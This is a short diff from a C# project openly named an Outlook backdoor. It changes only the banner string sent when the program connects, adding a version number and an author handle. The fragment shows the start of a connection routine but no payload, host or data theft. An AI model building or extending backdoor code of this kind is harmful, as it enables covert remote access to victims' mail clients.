@@ -85,7 +85,7 @@ namespace OutlookBackDoor_4
         public void dowork()
         {
         StartConn:
-            byte[] Sdata = Encoding.UTF8.GetBytes("\r\n\t\t\t----= OutLook Backdoor =---- \r\n");
+            byte[] Sdata = Encoding.UTF8.GetBytes("\r\n\t\t\t----= OutLook Backdoor v0.1=---- \r\n\t\t\t\tBy Xti9er");
 
             if (Connect())
             {
